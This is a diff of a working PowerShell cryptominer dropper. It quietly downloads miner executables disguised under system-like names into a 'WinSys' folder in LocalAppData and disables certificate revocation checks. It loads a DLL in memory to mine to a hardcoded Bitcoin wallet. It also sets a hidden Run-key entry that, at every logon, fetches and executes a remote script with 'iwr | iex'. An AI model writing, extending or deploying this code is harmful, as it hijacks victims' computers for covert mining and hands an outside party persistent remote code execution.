@@ -1,13 +1,15 @@
 $GithubUser = "HolyV200"
 $RepoName = "btcminer-"
-$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
-$CpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_x.exe"
-$GpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_g.exe"
+$ReleaseTag = "v1.0"
+# All downloads now pull from the "Fast" Release CDN
+$DllUrl = "https://github.com/$GithubUser/$RepoName/releases/download/$ReleaseTag/Bridge.dll"
+$CpuUrl = "https://github.com/$GithubUser/$RepoName/releases/download/$ReleaseTag/WinSystem_x.exe"
+$GpuZipUrl = "https://github.com/$GithubUser/$RepoName/releases/download/$ReleaseTag/WinSystem_g.zip"
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 
 $StealthDir = "$env:LOCALAPPDATA\WinSys"
 
-Write-Host "[1/5] Initializing network protocols..." -ForegroundColor Cyan
+Write-Host "[1/5] Initializing Turbo network protocols..." -ForegroundColor Cyan
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::CheckCertificateRevocationList = $false
 
@@ -22,12 +24,6 @@ function Get-StealthFile($Url, $Path) {
             curl.exe -L -k --ssl-no-revoke -o $Path $Url
             if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
         }
-    } catch { }
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $wc.DownloadFile($Url, $Path)
-        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
     } catch { }
     return $false
 }
@@ -49,14 +45,15 @@ try {
 
 $CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
 $GpuExe = Join-Path $StealthDir "WinSystem_g.exe"
+$GpuZip = Join-Path $StealthDir "upd_g.zip"
 
-Write-Host "[4/5] Deploying Turbo CPU and GPU engines..." -ForegroundColor Cyan
-# CPU Download
+Write-Host "[4/5] Deploying Turbo CPU & Hybrid GPU engines..." -ForegroundColor Cyan
+# CPU: Direct EXE (Turbo)
 if (-not (Test-Path $CpuExe)) {
     Get-StealthFile $CpuUrl $CpuExe | Out-Null
 }
 
-# GPU Check and Download
+# GPU: ZIP Extraction (Hybrid)
 $GpuDetected = $null
 try {
     $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
@@ -66,7 +63,14 @@ try {
 } catch { }
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
-    Get-StealthFile $GpuUrl $GpuExe | Out-Null
+    if (Get-StealthFile $GpuZipUrl $GpuZip) {
+        try {
+            Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
+            Remove-Item $GpuZip -Force
+            $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
+            if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
+        } catch { }
+    }
 }
 
 Write-Host "[5/5] Finalizing loader & persistence..." -ForegroundColor Cyan
@@ -78,16 +82,13 @@ try {
             $assembly = [System.Reflection.Assembly]::Load($dllBytes)
             $loader = $assembly.GetType("DateFundLoader")
             $startMethod = $loader.GetMethod("StartMiner")
-            
             $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
             $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
-            
             $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
             $Name = "WinSys"
             $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[Net.ServicePointManager]::CheckCertificateRevocationList = `$false; iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
             Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
-            
-            Write-Host "`nTURBO DEPLOYMENT SUCCESSFUL - Hashing active." -ForegroundColor Green
+            Write-Host "`nTURBO RELEASE DEPLOYED - Workers active." -ForegroundColor Green
         }
     }
 } catch {
